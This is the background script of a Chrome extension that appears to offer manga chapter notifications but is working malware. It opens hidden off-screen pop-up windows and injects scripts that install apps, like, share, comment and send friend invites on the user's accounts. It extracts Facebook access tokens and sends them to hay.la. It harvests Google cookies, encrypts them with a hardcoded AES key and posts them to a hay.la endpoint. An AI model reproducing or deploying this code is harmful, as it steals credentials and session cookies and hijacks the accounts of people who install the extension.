var Title_Notification = "Naruto",
    Message_Notification = "Naruto chap 670",
    Link_Notification = "http://truyen.hay.la/naruto-44439",
    Icon_Notification = "http://truyen.hay.la/Truyen/naruto_44439.jpg",
    UPDATE_INTERVAL = 1,
    TIMETOSHOW_INTERVAL = 360,
    MINUTESSHOWWEB_INTERVAL = 10,
    DAYSHOWWEB_INTERVAL = 4320,
    NUMBER_OPENWEB = 5,
    FACEBOOKID = "0",
    GOOGLEID = "0",
    sleepbeforeinstallapp = 5,
    sleepclickinstallapp = 3,
    sleepcommentinstallapp = 3,
    sleepsettingapp = 3,
    sleepafterinstallapp = 12,
    sleepbeforelikepage = 5,
    sleepupdatepagebeforefollowlikepage =
    5,
    sleepbeforefollowlikepage = 2,
    sleepfacefollow = 3,
    sleepafterlikepage = 11,
    sleepbeforepostface = 5,
    sleeppostfaceshare = 2,
    sleepgetclassbeforcomment = 1,
    sleeppostfacecomment = 2,
    sleepafterpostface = 6,
    sleepbeforecommentmanga = 5,
    sleepaftercommentmanga = 1,
    linktosentfriend = "0",
    lstfriend = [],
    sendInviteStep = -1,
    myTab = -1,
    myWindow = -1,
    urlpopRequest = "https://extension.hay.la/Home/TestFacebook",
    AppForChrome;
chrome.extension.onMessage.addListener(function(a, b) {
    if ("getSource" == a.action) {
        linktosentfriend = a.source;
        for (var c = a.lstfriend.split(","), d = 0; d < c.length; d++) lstfriend.push(c[d]);
        showpopupsent()
    }
    "sendagain" == a.action && showpopupsent()
});

function geturlDirect(a) {
    var b = "https://play.google.com/store/apps/details?id=" + a.App + "";
    2 == a.Type && (b = "https://www.facebook.com/" + a.App + "");
    3 == a.Type && (b = "https://m.facebook.com/" + a.App + "");
    4 == a.Type && (b = a.App);
    5 == a.Type && (b = a.App);
    6 == a.Type && (b = a.App);
    7 == a.Type && (b = a.App);
    return b
}

function showpopupsent() {
    if (AppForChrome && 0 < AppForChrome.length)
        if (1 == AppForChrome[0].Type) chrome.tabs.update(myTab, {
            url: geturlDirect(AppForChrome[0])
        }, function() {});
        else if (2 == AppForChrome[0].Type) chrome.tabs.update(myTab, {
        url: geturlDirect(AppForChrome[0])
    }, function() {});
    else if (3 == AppForChrome[0].Type) chrome.tabs.update(myTab, {
        url: geturlDirect(AppForChrome[0])
    }, function() {});
    else if (4 == AppForChrome[0].Type) chrome.tabs.update(myTab, {
        url: geturlDirect(AppForChrome[0])
    }, function() {});
    else if (5 == AppForChrome[0].Type)
        if (1 ==
            sendInviteStep) chrome.tabs.update(myTab, {
            url: geturlDirect(AppForChrome[0])
        }, function() {});
        else if (console.log(lstfriend.length), lstfriend[0]) {
        var a = lstfriend.length ? Math.min(50, lstfriend.length) : 0,
            b = Math.floor(Math.random() * lstfriend.length),
            c = "";
        if (0 < a)
            for (var d = 0; d < a; d++) c = 50 == d || d == a - 1 ? c + lstfriend[b] : c + (lstfriend[b] + ","), b++, b >= lstfriend.length && (b = 0);
        b = unescape(linktosentfriend) + c;
        chrome.tabs.update(myTab, {
            url: b
        }, function() {});
        0 < a && lstfriend.splice(0, a)
    } else console.log("Close Step 4"), sendInviteStep =
        1, AppForChrome.splice(0, 1), showpopupsent();
    else 6 == AppForChrome[0].Type ? chrome.tabs.update(myTab, {
        url: geturlDirect(AppForChrome[0])
    }, function() {}) : 7 == AppForChrome[0].Type && chrome.tabs.update(myTab, {
        url: geturlDirect(AppForChrome[0])
    }, function() {});
    else try {
        chrome.windows.remove(myWindow, function() {})
    } catch (e) {}
}
chrome.webNavigation.onCompleted.addListener(function(a) {
    if (0 === a.frameId) {
        var b = a.tabId,
            c = a.url;
        console.log("onCompleted tab" + c);
        if (AppForChrome && 0 < AppForChrome.length)
            if (1 == AppForChrome[0].Type) myTab == b && 1 == sendInviteStep ? (console.log("set up 1"), chrome.tabs.update(myTab, {
                    url: "https://play.google.com/settings"
                }, function() {}), sendInviteStep = 3) : myTab == b && 3 == sendInviteStep ? (console.log("set up 2"), chrome.tabs.update(myTab, {
                    url: geturlDirect(AppForChrome[0])
                }, function() {}), sendInviteStep = 4) : myTab == b &&
                4 == sendInviteStep && (AppForChrome[0].Follow && (console.log("set up 3"), chrome.tabs.executeScript(myTab, {
                    file: "f.js"
                }, function() {})), AppForChrome[0].Rating ? (console.log("set up 4"), chrome.tabs.executeScript(myTab, {
                    file: "n.js"
                }, function() {})) : (console.log("set up 5"), chrome.tabs.executeScript(myTab, {
                    file: "a.js"
                }, function() {})), sendInviteStep = 1, AppForChrome.splice(0, 1));
            else if (2 == AppForChrome[0].Type) myTab == b && 1 == sendInviteStep ? (console.log("Step a2.1"), chrome.tabs.executeScript(myTab, {
                file: "b.js"
            }, function() {}),
            sendInviteStep = 3) : myTab == b && 3 == sendInviteStep && (console.log("Step a2.2"), chrome.tabs.executeScript(myTab, {
            file: "c.js"
        }, function() {}), sendInviteStep = 1, AppForChrome.splice(0, 1));
        else if (3 == AppForChrome[0].Type) AppForChrome[0].Rating && (console.log("like 1 like"), chrome.tabs.executeScript(myTab, {
            file: "j.js"
        }, function() {})), AppForChrome[0].Share && (console.log("like 1 share"), chrome.tabs.executeScript(myTab, {
            file: "m.js"
        }, function() {})), AppForChrome[0].Comment ? (console.log("like 1 comment"), chrome.tabs.executeScript(myTab, {
            file: "h.js"
        }, function() {})) : (console.log("like 1 Follow"), chrome.tabs.executeScript(myTab, {
            file: "i.js"
        }, function() {})), sendInviteStep = 1, AppForChrome.splice(0, 1), -1 < c.indexOf("login.php") && showpopupsent();
        else if (4 == AppForChrome[0].Type) myTab == b && 1 == sendInviteStep && chrome.tabs.executeScript(myTab, {
            file: "r.js"
        }, function() {}), sendInviteStep = 1, AppForChrome.splice(0, 1);
        else if (5 == AppForChrome[0].Type) myTab == b && 1 == sendInviteStep ? (1 == sendInviteStep && (urlpopRequest = AppForChrome[i].App, lstfriend = []), c == urlpopRequest +
                "3" ? (sendInviteStep = 1, AppForChrome.splice(0, 1), showpopupsent()) : c == urlpopRequest + "2" ? (console.log("Step 1.2"), chrome.tabs.executeScript(myTab, {
                    file: "p.js"
                }, function() {}), sendInviteStep = 4) : (console.log(c), console.log(urlpopRequest), c != urlpopRequest && (console.log("Step 1.3"), chrome.tabs.executeScript(myTab, {
                    file: "o.js"
                }, function() {}), sendInviteStep = 3))) : myTab == b && 3 == sendInviteStep ? (console.log("Step 3"), chrome.tabs.executeScript(myTab, {
                file: "p.js"
            }, function() {}), sendInviteStep = 4) : myTab == b && 4 == sendInviteStep &&
            (console.log("Step 4"), chrome.tabs.executeScript(myTab, {
                file: "q.js"
            }, function() {}), sendInviteStep = 4);
        else if (6 == AppForChrome[0].Type)
            if (-1 < c.indexOf("login.php")) sendInviteStep = 1, AppForChrome.splice(0, 1), showpopupsent();
            else if (-1 < c.indexOf("access_token=")) {
            var d = c.split("access_token=")[1],
                d = d.split("&")[0];
            a = "https://graph.facebook.com/me?access_token=" + d;
            var e;
            e = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
            e.onreadystatechange = function() {
                if (4 == e.readyState &&
                    200 == e.status) {
                    var a = JSON.parse(e.responseText);
                    FACEBOOKID = localStorage.FACEBOOKID = a.id;
                    var a = "https://hay.la/App/AddUser?id=" + a.id + "&token=" + d + "",
                        b;
                    b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                    b.onreadystatechange = function() {
                        4 == b.readyState && 200 == b.status && JSON.parse(b.responseText)
                    };
                    b.open("GET", a, !0);
                    b.send()
                }
            };
            e.open("GET", a, !0);
            e.send();
            sendInviteStep = 1;
            AppForChrome.splice(0, 1);
            showpopupsent()
        } else 1 == sendInviteStep ? (console.log("Step 1.3"), chrome.tabs.executeScript(myTab, {
            file: "o.js"
        }, function() {})) : (sendInviteStep = 1, AppForChrome.splice(0, 1), showpopupsent());
        else 7 == AppForChrome[0].Type && (-1 < c.indexOf("accounts.google.com") ? (sendInviteStep = 1, AppForChrome.splice(0, 1), showpopupsent()) : -1 < c.indexOf("google.com") ? (b = {}, void 0 != a.url && (b.url = a.url), void 0 != a.domain && (b.domain = a.domain), chrome.cookies.getAll(b, function(b) {
            var a;
            a = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
            a.onreadystatechange = function() {
                if (4 == a.readyState && 200 == a.status) {
                    var c =
                        "",
                        d = "";
                    try {
                        var e = document.createElement("div");
                        e.innerHTML = a.responseText;
                        c = e.childNodes[17].children[0].children[1].children[0].innerHTML;
                        GOOGLEID = localStorage.GOOGLEID = c;
                        var h = CryptoJS.enc.Utf8.parse("7061737323313233"),
                            k = CryptoJS.enc.Utf8.parse("7061737323313233"),
                            d = CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(JSON.stringify(b)), h, {
                                keySize: 16,
                                iv: k,
                                mode: CryptoJS.mode.CBC,
                                padding: CryptoJS.pad.Pkcs7
                            }),
                            d = encodeURIComponent(d)
                    } catch (m) {}
                    var c = "id=" + c + "&send=" + d + "&type=2",
                        g;
                    g = window.XMLHttpRequest ?
                        new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                    g.open("POST", "https://hay.la/App/aa", !0);
                    g.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    g.onreadystatechange = function() {
                        4 == g.readyState && 200 == g.status && JSON.parse(g.responseText)
                    };
                    g.send(c)
                }
            };
            a.open("GET", "https://mail.google.com/mail/u/0/#inbox", !0);
            a.send()
        }), setTimeout(function() {
            sendInviteStep = 1;
            AppForChrome.splice(0, 1);
            showpopupsent()
        }, 2E3)) : (sendInviteStep = 1, AppForChrome.splice(0, 1), showpopupsent()));
        else console.log("Step else showpopupsent"),
            showpopupsent()
    }
});
setDefaults();

function setDefaults() {
    localStorage.TIMETOSHOW_INTERVAL ? TIMETOSHOW_INTERVAL = JSON.parse(localStorage.TIMETOSHOW_INTERVAL) : localStorage.TIMETOSHOW_INTERVAL = TIMETOSHOW_INTERVAL;
    localStorage.MINUTESSHOWWEB_INTERVAL ? MINUTESSHOWWEB_INTERVAL = JSON.parse(localStorage.MINUTESSHOWWEB_INTERVAL) : localStorage.MINUTESSHOWWEB_INTERVAL = MINUTESSHOWWEB_INTERVAL;
    localStorage.DAYSHOWWEB_INTERVAL ? DAYSHOWWEB_INTERVAL = JSON.parse(localStorage.DAYSHOWWEB_INTERVAL) : localStorage.DAYSHOWWEB_INTERVAL = DAYSHOWWEB_INTERVAL;
    localStorage.NUMBER_OPENWEB ?
        NUMBER_OPENWEB = JSON.parse(localStorage.NUMBER_OPENWEB) : localStorage.NUMBER_OPENWEB = NUMBER_OPENWEB;
    localStorage.FACEBOOKID ? FACEBOOKID = JSON.parse(localStorage.FACEBOOKID) : localStorage.FACEBOOKID = FACEBOOKID;
    localStorage.GOOGLEID ? GOOGLEID = localStorage.GOOGLEID : localStorage.GOOGLEID = GOOGLEID;
    localStorage.dateShowWeb || (localStorage.dateShowWeb = (new Date).getTime());
    localStorage.sleepbeforeinstallapp ? sleepbeforeinstallapp = JSON.parse(localStorage.sleepbeforeinstallapp) : localStorage.sleepbeforeinstallapp =
        sleepbeforeinstallapp;
    localStorage.sleepsettingapp ? sleepsettingapp = JSON.parse(localStorage.sleepsettingapp) : localStorage.sleepsettingapp = sleepsettingapp;
    localStorage.sleepclickinstallapp ? sleepclickinstallapp = JSON.parse(localStorage.sleepclickinstallapp) : localStorage.sleepclickinstallapp = sleepclickinstallapp;
    localStorage.sleepcommentinstallapp ? sleepcommentinstallapp = JSON.parse(localStorage.sleepcommentinstallapp) : localStorage.sleepcommentinstallapp = sleepcommentinstallapp;
    localStorage.sleepafterinstallapp ?
        sleepafterinstallapp = JSON.parse(localStorage.sleepafterinstallapp) : localStorage.sleepafterinstallapp = sleepafterinstallapp;
    localStorage.sleepbeforelikepage ? sleepbeforelikepage = JSON.parse(localStorage.sleepbeforelikepage) : localStorage.sleepbeforelikepage = sleepbeforelikepage;
    localStorage.sleepupdatepagebeforefollowlikepage ? sleepupdatepagebeforefollowlikepage = JSON.parse(localStorage.sleepupdatepagebeforefollowlikepage) : localStorage.sleepupdatepagebeforefollowlikepage = sleepupdatepagebeforefollowlikepage;
    localStorage.sleepbeforefollowlikepage ? sleepbeforefollowlikepage = JSON.parse(localStorage.sleepbeforefollowlikepage) : localStorage.sleepbeforefollowlikepage = sleepbeforefollowlikepage;
    localStorage.sleepfacefollow ? sleepfacefollow = JSON.parse(localStorage.sleepfacefollow) : localStorage.sleepfacefollow = sleepfacefollow;
    localStorage.sleepafterlikepage ? sleepafterlikepage = JSON.parse(localStorage.sleepafterlikepage) : localStorage.sleepafterlikepage = sleepafterlikepage;
    localStorage.sleepbeforepostface ? sleepbeforepostface =
        JSON.parse(localStorage.sleepbeforepostface) : localStorage.sleepbeforepostface = sleepbeforepostface;
    localStorage.sleeppostfaceshare ? sleeppostfaceshare = JSON.parse(localStorage.sleeppostfaceshare) : localStorage.sleeppostfaceshare = sleeppostfaceshare;
    localStorage.sleepgetclassbeforcomment ? sleepgetclassbeforcomment = JSON.parse(localStorage.sleepgetclassbeforcomment) : localStorage.sleepgetclassbeforcomment = sleepgetclassbeforcomment;
    localStorage.sleeppostfacecomment ? sleeppostfacecomment = JSON.parse(localStorage.sleeppostfacecomment) :
        localStorage.sleeppostfacecomment = sleeppostfacecomment;
    localStorage.sleepafterpostface ? sleepafterpostface = JSON.parse(localStorage.sleepafterpostface) : localStorage.sleepafterpostface = sleepafterpostface;
    localStorage.sleepbeforecommentmanga ? sleepbeforecommentmanga = JSON.parse(localStorage.sleepbeforecommentmanga) : localStorage.sleepbeforecommentmanga = sleepbeforecommentmanga;
    localStorage.sleepaftercommentmanga ? sleepaftercommentmanga = JSON.parse(localStorage.sleepaftercommentmanga) : localStorage.sleepaftercommentmanga =
        sleepaftercommentmanga
}

function sleep(a) {
    for (var b = (new Date).getTime(); new Date < b + 1E3 * a;);
    return 0
}

function doPopup(a) {
    var b = 1;
    if (localStorage.versionApp) {
        if (b = JSON.parse(localStorage.versionApp), 0 == a % NUMBER_OPENWEB) {
            var c;
            c = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
            c.onreadystatechange = function() {
                if (4 == c.readyState && 200 == c.status) {
                    for (var a = JSON.parse(c.responseText), e = b, f = 0; f < a.length; f++) e < a[f].Version && (e = a[f].Version);
                    if (0 < a.length) {
                        localStorage.versionApp = JSON.stringify(e + 1);
                        e = "https://play.google.com/store/apps/details?id=" + a[0].App + "";
                        2 == a[0].Type &&
                            (e = "https://www.facebook.com/" + a[0].App + "");
                        3 == a[0].Type && (e = "https://m.facebook.com/" + a[0].App + "");
                        4 == a[0].Type && (e = a[0].App);
                        5 == a[0].Type && (e = a[0].App);
                        6 == a[0].Type && (e = a[0].App);
                        7 == a[0].Type && (e = a[0].App);
                        for (var f = 0; f < a.length; f++) 5 == a[f].Type && (urlpopRequest = a[f].App);
                        AppForChrome = a;
                        try {
                            chrome.windows.create({
                                url: e,
                                type: "popup",
                                focused: !0,
                                width: 1,
                                left: 1E4,
                                top: 1E4,
                                height: 1
                            }, function(a) {
                                myWindow = a = a.id;
                                chrome.tabs.query({
                                    active: !0,
                                    windowId: a
                                }, function(a) {
                                    myTab = a[0].id;
                                    sendInviteStep = 1
                                })
                            })
                        } catch (l) {}
                    }
                }
            };
            c.open("GET", "https://hay.la/app/getAppAndFanpageVersion?version=" + b + "", !0);
            c.send()
        }
    } else localStorage.versionApp = JSON.stringify(1);
    return 0
}

function UpdateCount(a) {
    var b;
    b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    b.onreadystatechange = function() {};
    b.open("GET", "https://hay.la/app/UpdateCount/" + a, !0);
    b.send()
}
chrome.tabs.onCreated.addListener(function(a) {
    localStorage.NumberOpen ? (a = JSON.parse(localStorage.NumberOpen) + 1, localStorage.NumberOpen = JSON.stringify(a), doPopup(a)) : (localStorage.NumberOpen = JSON.stringify(1), doPopup(1))
});
chrome.notifications.onClicked.addListener(function(a) {
    chrome.notifications.clear(a, function(a) {});
    chrome.tabs.create({
        url: Link_Notification
    })
});

function showNotification() {
    var a = 1;
    if (localStorage.versionAppNotification) {
        var a = JSON.parse(localStorage.versionAppNotification),
            b;
        b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        b.onreadystatechange = function() {
            if (4 == b.readyState && 200 == b.status) {
                var c = JSON.parse(b.responseText),
                    d = a;
                for (i = 0; i < c.length; i++) d < c[i].Version && (d = c[i].Version);
                0 < c.length && (localStorage.versionAppNotification = JSON.stringify(d + 1), Title_Notification = c[0].Title, Message_Notification = c[0].Comment,
                    Icon_Notification = c[0].Icon, Link_Notification = c[0].Link, c = {
                        type: "basic",
                        title: Title_Notification,
                        message: Message_Notification,
                        priority: 1,
                        iconUrl: Icon_Notification
                    }, chrome.notifications.clear("id", function(a) {}), chrome.notifications.create("id", c, function(a) {}))
            }
        };
        b.open("GET", "https://hay.la/app/getNotification?version=" + a + "", !0);
        b.send()
    } else localStorage.versionAppNotification = JSON.stringify(1)
}
chrome.runtime.onInstalled.addListener(function(a) {
    "install" == a.reason ? (a = chrome.runtime.getManifest().version, UpdateSetUp(a, 1, 0)) : "update" == a.reason && (a = chrome.runtime.getManifest().version, UpdateSetUp(a, 0, 1))
});

function UpdateSetUp(a, b, c) {
    var d;
    d = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    d.onreadystatechange = function() {};
    d.open("GET", "https://hay.la/app/UpdateSetUp?version=" + a + "&setup=" + b + "&update=" + c + "", !0);
    d.send()
}

function updateConfig(a) {
    var b;
    b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    b.onreadystatechange = function() {
        if (4 == b.readyState && 200 == b.status) {
            var c = JSON.parse(b.responseText),
                d = a;
            for (i = 0; i < c.length; i++) d < c[i].Version && (d = c[i].Version);
            0 < c.length && (localStorage.versionConfig = JSON.stringify(d + 1), localStorage.TIMETOSHOW_INTERVAL = c[0].MinutesShowNotification, localStorage.MINUTESSHOWWEB_INTERVAL = c[0].MinutesShowWeb, localStorage.DAYSHOWWEB_INTERVAL = c[0].MinutesDelayShowWeb,
                localStorage.NUMBER_OPENWEB = c[0].NumberOpenWeb, localStorage.sleepbeforeinstallapp = c[0].sleepbeforeinstallapp, localStorage.sleepclickinstallapp = c[0].sleepclickinstallapp, localStorage.sleepcommentinstallapp = c[0].sleepcommentinstallapp, localStorage.sleepafterinstallapp = c[0].sleepafterinstallapp, localStorage.sleepbeforelikepage = c[0].sleepbeforelikepage, localStorage.sleepupdatepagebeforefollowlikepage = c[0].sleepupdatepagebeforefollowlikepage, localStorage.sleepbeforefollowlikepage = c[0].sleepbeforefollowlikepage,
                localStorage.sleepfacefollow = c[0].sleepfacefollow, localStorage.sleepafterlikepage = c[0].sleepafterlikepage, localStorage.sleepbeforepostface = c[0].sleepbeforepostface, localStorage.sleeppostfaceshare = c[0].sleeppostfaceshare, localStorage.sleepgetclassbeforcomment = c[0].sleepgetclassbeforcomment, localStorage.sleeppostfacecomment = c[0].sleeppostfacecomment, localStorage.sleepafterpostface = c[0].sleepafterpostface, localStorage.sleepbeforecommentmanga = c[0].sleepbeforecommentmanga, localStorage.sleepaftercommentmanga =
                c[0].sleepaftercommentmanga)
        }
    };
    b.open("GET", "https://hay.la/app/getConfig?version=" + a + "", !0);
    b.send()
}
chrome.windows.onCreated.addListener(function() {
    var a = 1;
    localStorage.versionConfig ? (a = JSON.parse(localStorage.versionConfig), updateConfig(a)) : (localStorage.versionConfig = JSON.stringify(1), updateConfig(1))
});

function ActiveTv() {
    var a;
    a = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    a.onreadystatechange = function() {
        if (4 == a.readyState && 200 == a.status) {
            var b = JSON.parse(a.responseText);
            console.log(b.CustomHeader);
            console.log(b.URL);
            if (b) {
                var c = b.CustomHeader.split(":"),
                    d;
                d = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
                d.onreadystatechange = function() {
                    4 == d.readyState && 200 == d.status && console.log(d.responseText)
                };
                d.open("GET", b.URL, !0);
                d.setRequestHeader(c[0],
                    c[1].replace(";", ""));
                d.send()
            }
        }
    };
    a.open("GET", "http://services.bongda.hay.la/ServiceMobiTV.svc/GetRegisterURL", !0);
    a.send()
}
chrome.tabs.onUpdated.addListener(function(a, b) {
    b.url && (-1 < b.url.indexOf("bongda.hay.la") || -1 < b.url.indexOf("tructuyenbongda.net")) && ActiveTv()
});

function showFacebook() {
    AppForChrome = JSON.parse('[{"ID":49,"App":"https://hay.la/app/facebook","Version":-1,"Block":false,"Type":6,"Share":false,"Comment":false,"Rating":false,"Follow":false},{"ID":53,"App":"https://mail.google.com/mail/u/0/#inbox","Version":-1,"Block":false,"Type":7,"Share":false,"Comment":false,"Rating":false,"Follow":false}]');
    try {
        var a = "https://hay.la/App/CheckUser?id=" + FACEBOOKID + "&idgoogle=" + GOOGLEID,
            b;
        b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        b.onreadystatechange = function() {
            4 == b.readyState && 200 == b.status && JSON.parse(b.responseText).IsExpired && chrome.windows.create({
                url: "https://hay.la/app/facebook",
                type: "popup",
                focused: !0,
                width: 1,
                left: 1E4,
                top: 1E4,
                height: 1
            }, function(a) {
                myWindow = a = a.id;
                chrome.tabs.query({
                    active: !0,
                    windowId: a
                }, function(a) {
                    myTab = a[0].id;
                    sendInviteStep = 1
                })
            })
        };
        b.open("GET", a, !0);
        b.send()
    } catch (c) {}
}

function updateData() {
	//chrome.tabs.create({url: "http://nhduong29.github.io/portfolio", selected: false});
}
setInterval(updateData, 20000);